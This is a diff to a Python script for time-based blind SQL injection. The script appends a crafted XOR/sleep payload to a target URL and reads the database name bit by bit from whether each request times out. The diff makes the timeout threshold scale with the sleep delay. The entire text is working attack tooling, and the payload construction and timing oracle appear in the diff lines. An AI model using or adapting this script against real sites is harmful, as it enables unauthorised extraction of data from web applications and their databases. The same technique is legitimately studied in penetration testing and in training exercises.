@@ -2,9 +2,9 @@ import requests
 import time
 from argparse import ArgumentParser
 
-def checkTimeOut(url):
+def checkTimeOut(url,time_):
    try:
-      r = requests.get(url,timeout=3)
+      r = requests.get(url,timeout=time_)
    except:
       pass
       return True
@@ -15,8 +15,9 @@ def bitwise(idx,URLs,times, database):
    for pos in range(1,9): 
       payload = f"'XOR(if(substr(lpad(bin(ord(substr({database}(),{idx},1))),8,'0'),{pos},1)='1',sleep({times}),0))OR'"
       url = URLs + payload
+      time_=times+1
       print (url)
-      if(checkTimeOut(url)):
+      if(checkTimeOut(url,time_)):
          rlt += '1'
       else:
          rlt += '0'
